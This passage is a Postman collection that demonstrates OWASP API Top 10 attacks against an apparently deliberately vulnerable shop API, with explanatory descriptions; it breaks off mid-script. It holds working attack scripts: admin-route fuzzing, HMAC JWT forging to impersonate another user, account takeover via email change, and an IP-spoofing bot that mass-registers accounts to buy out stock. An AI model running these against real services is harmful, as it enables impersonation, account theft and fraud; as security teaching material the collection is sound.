@@ -1,0 +1,2064 @@
+{
+	"info": {
+		"_postman_id": "8d1cbfe0-a94b-4182-b136-3f85733f18a5",
+		"name": "OWASP API Security - Attacks Demo",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "51201362",
+		"_collection_link": "https://laura-luc-2786502.postman.co/workspace/Laura-Luc's-Workspace~fda64601-2020-4ec6-82d0-07e08cac3580/collection/51201362-8d1cbfe0-a94b-4182-b136-3f85733f18a5?action=share&source=collection_link&creator=51201362"
+	},
+	"item": [
+		{
+			"name": "PHASE 1 : Discovery & Identity",
+			"item": [
+				{
+					"name": "01 - API9 Improper Assets Management",
+					"item": [
+						{
+							"name": "Request 1.1 : Health Check",
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/health",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"health"
+									]
+								},
+								"description": "Verify that the API is accessible. First request from an attacker."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 1.2 : Get OpenAPI Documentation",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Status code is 200 - Documentation is Public\", function() {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"pm.test(\"Vulnerability confirmed : admin routes exposed\", function() {",
+											"    const jsonData = pm.response.json();",
+											"    const paths = Object.keys(jsonData.paths);",
+											"    const adminRoutes = paths.filter(p => p.includes('/admin'));",
+											"    console.log(\"Sensitive admin routes discovered :\", adminRoutes);",
+											"    pm.expect(adminRoutes.length).to.be.above(0);",
+											"});"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/openapi.json",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"openapi.json"
+									]
+								},
+								"description": "API9 Vulnerability : OpenAPI documentation reveals all routes, including hidden admin endpoints. An attacker now has a complete map of the system."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 1.3 : Fuzzing - Test admin endpoints",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"const common_endpoints = [",
+											"    \"/admin\", ",
+											"    \"/api/admin\", ",
+											"    \"/users/admin\", ",
+											"    \"/admin/users\", ",
+											"    \"/admin/orders\", ",
+											"    \"/dashboard\", ",
+											"    \"/control-panel\",",
+											"    \"/admin/dashboard\",",
+											"    \"/admin/promote\",",
+											"    \"/admin/stats\",",
+											"    \"/admin/messages\"",
+											"];",
+											"const baseUrl = pm.environment.get(\"base_url\");",
+											"console.log(\"Starting fuzzing : Testing \" + common_endpoints.length + \" potential endpoints\");",
+											"",
+											"//counter to track found routes",
+											"let foundRoutes = 0;",
+											"let endpoint2 = \"/admin/promote/1\";",
+											"let url2 = baseUrl + endpoint2",
+											"const attackerHeaders = {",
+											"    'X-Forwarded-For': '1.2.3.4', // simulated IP",
+											"    'User-Agent': 'PostmanRuntime/Fuzzer'",
+											"};",
+											"",
+											"common_endpoints.forEach((endpoint) => {",
+											"    const url = baseUrl + endpoint;",
+											"    pm.sendRequest({",
+											"        url: url,",
+											"        method: 'GET',",
+											"        header: attackerHeaders",
+											"    }, function (err, res) {",
+											"        if (err) {",
+											"            console.log(\"Error requesting \" + endpoint);",
+											"        } else {",
+											"            // if status is NOT 404, the route exists (even if 401/403)",
+											"            if (res.code !== 404) {",
+											"                console.log(`Potential route found : ${endpoint} (Status: ${res.code})`);",
+											"                foundRoutes++;",
+											"            } ",
+											"        }",
+											"    });",
+											"});",
+											"pm.sendRequest({",
+											"        url: url2,",
+											"        method: 'POST',",
+											"        header: attackerHeaders",
+											"}, function (err, res) {",
+											"    if (err) {",
+											"        console.log(\"Error requesting \" + endpoint2);",
+											"    } else {",
+											"            // if status is NOT 404, the route exists (even if 401/403)",
+											"        if (res.code !== 404) {",
+											"            console.log(`Potential route found : ${endpoint2} (Status: ${res.code})`);",
+											"            foundRoutes++;",
+											"        } ",
+											"    }",
+											"});",
+											"",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}",
+									"host": [
+										"{{base_url}}"
+									]
+								},
+								"description": "Basic fuzzing test. If 404, the route does not exist. If 401/403, it exists but is protected. Automated to test multiple possible routes in a given list, using JavaScript scripting. See results in the Console."
+							},
+							"response": []
+						}
+					],
+					"description": "Discovery of the attack surface"
+				},
+				{
+					"name": "02 - API2 Broken Authentication",
+					"item": [
+						{
+							"name": "02a - Weak secret attack",
+							"item": [
+								{
+									"name": "Request 2a.1 : Login Attacker (Get Token)",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													"pm.test(\"Login successful\", function() {",
+													"    pm.response.to.have.status(200);",
+													"});",
+													"var jsonData = pm.response.json();",
+													"var tokenAttacker = jsonData.access_token;",
+													"if (tokenAttacker) {",
+													"    pm.environment.set(\"attacker_token\", tokenAttacker);",
+													"    pm.environment.set(\"attacker_id\", jsonData.user_id);",
+													"    console.log(\"---------------------------------------------------\");",
+													"    console.log(\"[INFO] COPY THIS TOKEN FOR JWT.IO :\");",
+													"    console.log(tokenAttacker);",
+													"    console.log(\"---------------------------------------------------\");",
+													"}"
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"request": {
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "urlencoded",
+											"urlencoded": [
+												{
+													"key": "username",
+													"value": "badguy",
+													"type": "text"
+												},
+												{
+													"key": "password",
+													"value": "thisismypwd!",
+													"type": "text"
+												}
+											]
+										},
+										"url": {
+											"raw": "{{base_url}}/auth/login",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"auth",
+												"login"
+											]
+										},
+										"description": "The attacker logs in with their own account to obtain a legitimate token that they will analyze. (Copy the access_token you see in the json for what's to come next!)"
+									},
+									"response": []
+								},
+								{
+									"name": "Request 2a.2 : Decode Token (Manual)",
+									"request": {
+										"auth": {
+											"type": "noauth"
+										},
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": ""
+										},
+										"description": "This “request” is actually a manual instruction.\n\n**Instructions:**\n\n1\\. Copy the token from the previous response.\n\n2\\. Go to [https://jwt.io](https://jwt.io).\n\n3\\. Paste the token.\n\n4\\. Observe the structure: {“sub”: “badguy”} : this gives us how the payload will be made\n\n5\\. Test common secrets in the “VERIFY SIGNATURE” field and find out which one is the correct one (_secret123_)"
+									},
+									"response": []
+								},
+								{
+									"name": "Request 2a.3 : Check report status",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										},
+										{
+											"listen": "prerequest",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"protocolProfileBehavior": {
+										"disableBodyPruning": true
+									},
+									"request": {
+										"auth": {
+											"type": "bearer",
+											"bearer": [
+												{
+													"key": "token",
+													"value": "{{attacker_token}}",
+													"type": "string"
+												}
+											]
+										},
+										"method": "GET",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": ""
+										},
+										"url": {
+											"raw": "{{base_url}}/products/666/reports",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"products",
+												"666",
+												"reports"
+											]
+										},
+										"description": "The attackers sees that user1 made a report about the product they are selling. They now want to be able to modify this report and make it look by a mistake from user1. They will need to find a way to pretend to be user1 for that."
+									},
+									"response": []
+								},
+								{
+									"name": "Request 2a.4 : Forge and test user token",
+									"event": [
+										{
+											"listen": "prerequest",
+											"script": {
+												"exec": [
+													"var secret = \"secret123\"; // the secret we just found",
+													"console.log(\"[INFO] Forging admin token using discovered secret : \" + secret);",
+													"var header = { \"alg\": \"HS256\", \"typ\": \"JWT\" };",
+													"var payload = { \"sub\": \"user1\", \"iat\": Math.floor(Date.now() / 1000) };",
+													"// we make a token imitating user1",
+													"",
+													"function base64url(source) {",
+													"    var encodedSource = CryptoJS.enc.Base64.stringify(source);",
+													"    encodedSource = encodedSource.replace(/=+$/, '');",
+													"    encodedSource = encodedSource.replace(/\\+/g, '-');",
+													"    encodedSource = encodedSource.replace(/\\//g, '_');",
+													"    return encodedSource;",
+													"}",
+													"",
+													"var encodedHeader = base64url(CryptoJS.enc.Utf8.parse(JSON.stringify(header)));",
+													"var encodedPayload = base64url(CryptoJS.enc.Utf8.parse(JSON.stringify(payload)));",
+													"",
+													"var signatureContent = encodedHeader + \".\" + encodedPayload;",
+													"var signature = CryptoJS.HmacSHA256(signatureContent, secret);",
+													"var encodedSignature = base64url(signature);",
+													"",
+													"var user1Token = encodedHeader + \".\" + encodedPayload + \".\" + encodedSignature;",
+													"",
+													"// inject into environment",
+													"pm.environment.set(\"forged_victim_token\", user1Token);",
+													"console.log(\"[SUCCESS] User1 Token created.\");"
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										},
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"request": {
+										"auth": {
+											"type": "bearer",
+											"bearer": [
+												{
+													"key": "token",
+													"value": "{{forged_victim_token}}",
+													"type": "string"
+												}
+											]
+										},
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\n    \"reason\": \"Sorry, that was my mistake. The product is authentic and excellent.\"\n}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": {
+											"raw": "{{base_url}}/products/666/reports",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"products",
+												"666",
+												"reports"
+											]
+										},
+										"description": "Using the secret discovered in step 2a.2 (`secret123`), we execute a **Pre-request Script** to forge a new token of user1.  \n**The Script logic:**\n\n1. It constructs a valid JWT Header (`HS256`).\n    \n2. It constructs a Payload impersonating `user1` (`\"sub\": \"user1\"`).\n    \n3. It signs this data using the weak secret `secret123`.\n    \n4. It saves this fraudulent token into the environment variable `forged_victim_token`.\n    \n\nThen, we check that the attacker created a working token by excecuting the request to modify the report made by user1, and the response shows that the report was indeed modified, by user1. (see post-request script)."
+									},
+									"response": []
+								},
+								{
+									"name": "Request 2a.5 : Check new report status",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"protocolProfileBehavior": {
+										"disableBodyPruning": true
+									},
+									"request": {
+										"auth": {
+											"type": "bearer",
+											"bearer": [
+												{
+													"key": "token",
+													"value": "{{forged_victim_token}}",
+													"type": "string"
+												}
+											]
+										},
+										"method": "GET",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": ""
+										},
+										"url": {
+											"raw": "{{base_url}}/products/666/reports",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"products",
+												"666",
+												"reports"
+											]
+										},
+										"description": "Checking report modification again."
+									},
+									"response": []
+								}
+							],
+							"description": "**Goal:** Crack the secret key used to sign the tokens and forge a fake admin token.  \nThe API uses JSON Web Tokens (JWT) for authentication. If the server uses a weak secret key (like \"secret123\"), an attacker can brute-force it offline, then generate their own valid tokens for any user."
+						},
+						{
+							"name": "02b - Account Takeover",
+							"item": [
+								{
+									"name": "Request 2b.1 : Check if ID of user1 is correct",
+									"request": {
+										"auth": {
+											"type": "bearer",
+											"bearer": [
+												{
+													"key": "token",
+													"value": "{{attacker_token}}",
+													"type": "string"
+												}
+											]
+										},
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "{{base_url}}/users/2",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"users",
+												"2"
+											]
+										},
+										"description": "**Reconnaissance:** We confirm the user ID of our victim (`user1`), which was given by \"reporter_id\": 2 in the request to see the report."
+									},
+									"response": []
+								},
+								{
+									"name": "Request 2b.2 : Modify email without password",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"request": {
+										"auth": {
+											"type": "bearer",
+											"bearer": [
+												{
+													"key": "token",
+													"value": "{{attacker_token}}",
+													"type": "string"
+												}
+											]
+										},
+										"method": "PATCH",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\n  \"email\": \"badguy2@free.fr\"\n}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": {
+											"raw": "{{base_url}}/users/2",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"users",
+												"2"
+											]
+										},
+										"description": "API2 vulnerability: No re-authentication required to change the email address. Combined with a stolen token (API8), this allows for complete account takeover."
+									},
+									"response": []
+								},
+								{
+									"name": "Request 2b.3 : Reset password",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"request": {
+										"auth": {
+											"type": "noauth"
+										},
+										"method": "POST",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\n  \"email\": \"badguy2@free.fr\"\n}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": {
+											"raw": "{{base_url}}/auth/forgot-password",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"auth",
+												"forgot-password"
+											]
+										},
+										"description": "Now that the email associated with `user1` belongs to the attacker, we trigger the \"Forgot Password\" flow.  \n**Result:** The reset link/code is sent to the attacker's mailbox. The attacker sets a new password, effectively locking the real victim out of their account forever."
+									},
+									"response": []
+								}
+							],
+							"description": "The attacker has a valid token of user1 after forging it previously. They want to change the account's email address so they can then reset the password and kick the victim out."
+						}
+					],
+					"description": "**Vulnerability Focus:** Authentication mechanisms are poorly implemented, allowing attackers to compromise passwords, keys, or session tokens.  \nIn this section, we demonstrate two major flaws: **Weak JWT Signing Key** and **Account Takeover via logic flaws**."
+				}
+			],
+			"description": "The first phase consists of understanding the exposed API, its endpoints, its security mechanisms, and the information accessible without authentication or with limited privileges. This step is essential for building a coherent attack strategy. We therefore put ourselves in the shoes of the attacker who is trying to understand how the API works in order to attack it later."
+		},
+		{
+			"name": "PHASE 2 : Access to data (Objects & Properties)",
+			"item": [
+				{
+					"name": "03 - API1 Broken Object Level Authorization (BOLA)",
+					"item": [
+						{
+							"name": "Request 3.1 : Access own profile",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/users/{{attacker_id}}",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"users",
+										"{{attacker_id}}"
+									]
+								},
+								"description": "Normal behavior: the attacker accesses their own profile."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 3.2 : Access other user profile (BOLA)",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/users/3",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"users",
+										"3"
+									]
+								},
+								"description": "API1 vulnerability : No verification that user_id == current_user.id. The endpoint only verifies that the user is authenticated, not that they are accessing **their** own data."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 3.3 : Access other user orders (BOLA)",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"VULNERABLE: Accessed another user's orders\", function () {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"",
+											"if (pm.response.code === 200) {",
+											"    var orders = pm.response.json();",
+											"    console.log(\"[DATA LEAK] Order history retrieved. Total orders: \" + orders.length);",
+											"    ",
+											"    if(orders.length > 0) {",
+											"        console.log(\"[SAMPLE] First order total: \" + orders[0].total_price);",
+											"    }",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/orders/user/6",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"orders",
+										"user",
+										"6"
+									]
+								},
+								"description": "Same vulnerability on orders. The attacker can see anyone's purchase history."
+							},
+							"response": []
+						}
+					],
+					"description": "Unauthorized access to other users' objects"
+				},
+				{
+					"name": "04 - API3 Excessive Data Exposure & Mass Assignment",
+					"item": [
+						{
+							"name": "04a - Excessive Data Exposure",
+							"item": [
+								{
+									"name": "Request 4a.1 : Get product details (public)",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "{{base_url}}/products/50",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"products",
+												"50"
+											]
+										},
+										"description": "API3 vulnerability - **Excessive Data Exposure** : The endpoint returns the complete seller object instead of just seller.username."
+									},
+									"response": []
+								}
+							],
+							"description": "The API exposes sensitive data in responses (Exposure)"
+						},
+						{
+							"name": "04b - Mass Assignment (product unblock)",
+							"item": [
+								{
+									"name": "Request 4b.1 : Check blocked product",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"request": {
+										"method": "GET",
+										"header": [],
+										"url": {
+											"raw": "{{base_url}}/products/666",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"products",
+												"666"
+											]
+										},
+										"description": "We inspect the attacker's product (e.g., ID 666) to see its current status.  \n**Observation:** Notice the `\"blocked\": true` (or false) property in the response. Normally, only admins should be able to change this status."
+									},
+									"response": []
+								},
+								{
+									"name": "Request 4b.2 : Unblock product (Mass Assignment)",
+									"event": [
+										{
+											"listen": "test",
+											"script": {
+												"exec": [
+													""
+												],
+												"type": "text/javascript",
+												"packages": {},
+												"requests": {}
+											}
+										}
+									],
+									"request": {
+										"auth": {
+											"type": "bearer",
+											"bearer": [
+												{
+													"key": "token",
+													"value": "{{attacker_token}}",
+													"type": "string"
+												}
+											]
+										},
+										"method": "PATCH",
+										"header": [],
+										"body": {
+											"mode": "raw",
+											"raw": "{\n  \"description\": \"New product compliant with regulations\",\n  \"blocked\": false\n}",
+											"options": {
+												"raw": {
+													"language": "json"
+												}
+											}
+										},
+										"url": {
+											"raw": "{{base_url}}/products/666",
+											"host": [
+												"{{base_url}}"
+											],
+											"path": [
+												"products",
+												"666"
+											]
+										},
+										"description": "The endpoint for updating a product takes the JSON body and binds it directly to the database object without filtering fields.  \n**Exploit:** Even though the attacker is are a standard seller, they send a PATCH request containing `\"blocked\": false`. The server blindly accepts this field and updates the critical status, bypassing the business logic that reserves this action for admins."
+									},
+									"response": []
+								}
+							],
+							"description": "Same Mass Assignment vulnerability on products. Here, the attacker is an angry banned seller and tries to unlock their own product."
+						}
+					],
+					"description": "Data overexposure and modification of prohibited properties"
+				}
+			],
+			"description": "**Vulnerability Focus:** Accessing data that doesn't belong to the attacker (BOLA) or seeing more data than intended (Excessive Data Exposure)."
+		},
+		{
+			"name": "PHASE 3 - Misuse of Business Logic and Privileges",
+			"item": [
+				{
+					"name": "05 - API6 Unrestricted Resource Consumption (Scalper)",
+					"item": [
+						{
+							"name": "Request 5.1 : Check target product stock",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/products/999",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"products",
+										"999"
+									]
+								},
+								"description": "The attacker wants to buy all the stock of a product in limited edition, to then buy it at a higher price."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 5.2 : Trying to buy with same account (x2)",
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "\n{\n  \"product_id\": 999,\n  \"quantity\": 1\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{base_url}}/orders",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"orders"
+									]
+								},
+								"description": "We attempt to buy the limited product twice with the same account.  \n**Result:** The server rejects the second purchase. This confirms that basic Business Logic (Quota per user) is functioning correctly. We need a more sophisticated attack"
+							},
+							"response": []
+						},
+						{
+							"name": "Request 5.3 : Trying to create first account",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"username\": \"bot\",\n  \"email\": \"bot@fake.com\",\n  \"password\": \"password123\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{base_url}}/auth/register",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"auth",
+										"register"
+									]
+								},
+								"description": "We create a legitimate account to buy the product with another account, and test the registration flow."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 5.4 : Trying to create 2nd account with same IP",
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"username\": \"bott\",\n  \"email\": \"bott@fake.com\",\n  \"password\": \"password123\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{base_url}}/auth/register",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"auth",
+										"register"
+									]
+								},
+								"description": "We attempt to create a second account immediately from the same IP address.  \n**Result:** The server blocks this, it means there is an IP-based Rate Limiting or anti-spam protection in place."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 5.5 : Bot 1 - Create account",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "X-Forwarded-For",
+										"value": "192.168.1.100",
+										"type": "text"
+									},
+									{
+										"key": "User-Agent",
+										"value": "Mozilla/5.0 Bot",
+										"type": "text"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"username\": \"bot00\",\n  \"email\": \"bot1@fake.com\",\n  \"password\": \"password123\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{base_url}}/auth/register",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"auth",
+										"register"
+									]
+								},
+								"description": "The attacker creates a first bot with another IP from theirs (here, we just modify the header by manipulating the `X-Forwarded-For` HTTP header, to mimic a real other IP bought by the attacker).\n\n**Exploit:** We set the header to a fake IP (`192.168.1.50`). The server trusts this header and believes the request comes from a different machine, allowing the account creation"
+							},
+							"response": []
+						},
+						{
+							"name": "Request 5.6 : Bot 1 - Login",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"const jsonData = pm.response.json();",
+											"pm.environment.set(\"bot1_token\", jsonData.access_token);"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "X-Forwarded-For",
+										"value": "192.168.1.100",
+										"type": "text"
+									},
+									{
+										"key": "User-Agent",
+										"value": "Mozilla/5.0 Bot",
+										"type": "text"
+									}
+								],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "password",
+											"value": "password123",
+											"type": "text"
+										},
+										{
+											"key": "username",
+											"value": "bot00",
+											"type": "text"
+										}
+									]
+								},
+								"url": {
+									"raw": "{{base_url}}/auth/login",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								},
+								"description": "The bot logs in with the newly created credentials to obtain a valid access token for the purchase."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 5.7 : Bot 1 - Buy product",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{bot1_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "POST",
+								"header": [
+									{
+										"key": "X-Forwarded-For",
+										"value": "192.168.1.100",
+										"type": "text"
+									},
+									{
+										"key": "User-Agent",
+										"value": "Mozilla/5.0 Bot",
+										"type": "text"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "\n{\n  \"product_id\": 999,\n  \"quantity\": 1\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{base_url}}/orders",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"orders"
+									]
+								},
+								"description": "The bot executes a valid order for the limited product. Since it's a \"new\" user, the quota check passes."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 5.8 : Launch Scalper Attack (Distributed bots)",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"// CONFIGURATION",
+											"const TOTAL_BOTS = 20; // Number of attempts (equivalent to range(1, 20))",
+											"const TARGET_PRODUCT = 999;",
+											"const BASE_URL = pm.environment.get(\"base_url\");",
+											"",
+											"console.clear();",
+											"console.log(`[START] Launching SCALPER attack with ${TOTAL_BOTS} distributed bots...`);",
+											"console.log(\"Objective: Deplete stock via IP spoofing and multi-account usage\");",
+											"",
+											"let stockAcquired = 0;",
+											"let botsFinished = 0;",
+											"",
+											"// Function to generate a random IP address (fake IP)",
+											"function generateFakeIP() {",
+											"    return \"192.168.\" + Math.floor(Math.random() * 255) + \".\" + Math.floor(Math.random() * 255);",
+											"}",
+											"",
+											"",
+											"function launchBot(botId) {",
+											"    const fakeIp = generateFakeIP();",
+											"    const username = \"bot_\" + pm.variables.replaceIn('{{$randomUserName}}') + \"_\" + botId;",
+											"    const password = \"password123\";",
+											"    const email = `bot${botId}_${Date.now()}@fake.com`;",
+											"    const captchaGuess = Math.floor(Math.random() * 11); // Random value between 0 and 10",
+											"",
+											"    const headers = {",
+											"        \"Content-Type\": \"application/json\",",
+											"        \"X-Forwarded-For\": fakeIp,",
+											"        \"User-Agent\": \"Mozilla/5.0 Bot\"",
+											"    };",
+											"",
+											"    console.log(`[BOT #${botId}] Started on IP: ${fakeIp}`);",
+											"",
+											"    // STEP 1: REGISTER",
+											"    pm.sendRequest({",
+											"        url: BASE_URL + \"/auth/register\",",
+											"        method: 'POST',",
+											"        header: headers,",
+											"        body: {",
+											"            mode: 'raw',",
+											"            raw: JSON.stringify({",
+											"                \"username\": username,",
+											"                \"email\": email,",
+											"                \"password\": password,",
+											"                \"captcha_answer\": captchaGuess",
+											"            })",
+											"        }",
+											"    }, function (err, res) {",
+											"        if (err || res.code !== 200) {",
+											"            console.log(`[BOT #${botId}] Registration failed (Code: ${res.code})`);",
+											"            checkFinish();",
+											"            return;",
+											"        }",
+											"",
+											"        pm.sendRequest({",
+											"            url: BASE_URL + \"/auth/login\",",
+											"            method: 'POST',",
+											"            header: { ...headers, \"Content-Type\": \"application/x-www-form-urlencoded\" },",
+											"            body: {",
+											"                mode: 'urlencoded',",
+											"                urlencoded: [",
+											"                    { key: \"username\", value: username },",
+											"                    { key: \"password\", value: password }",
+											"                ]",
+											"            }",
+											"        }, function (err, res) {",
+											"            if (err || res.code !== 200) {",
+											"                console.log(`[BOT #${botId}] Login failed`);",
+											"                checkFinish();",
+											"                return;",
+											"            }",
+											"",
+											"            const token = res.json().access_token;",
+											"",
+											"            pm.sendRequest({",
+											"                url: BASE_URL + \"/orders\",",
+											"                method: 'POST',",
+											"                header: { ",
+											"                    ...headers, ",
+											"                    \"Authorization\": \"Bearer \" + token ",
+											"                },",
+											"                body: {",
+											"                    mode: 'raw',",
+											"                    raw: JSON.stringify({",
+											"                        \"product_id\": TARGET_PRODUCT,",
+											"                        \"quantity\": 1",
+											"                    })",
+											"                }",
+											"            }, function (err, res) {",
+											"                if (res.code === 200) {",
+											"                    stockAcquired++;",
+											"                    console.log(`[BOT #${botId}] PURCHASE SUCCESSFUL. Total stock acquired: ${stockAcquired}`);",
+											"                } else {",
+											"                    // Check for out-of-stock condition",
+											"                    if (res.text().includes(\"Out of stock\")) {",
+											"                        console.log(`[BOT #${botId}] OUT OF STOCK. Operation completed`);",
+											"                    } else {",
+											"                        console.log(`[BOT #${botId}] Purchase rejected: ${res.text()}`);",
+											"                    }",
+											"                }",
+											"                checkFinish();",
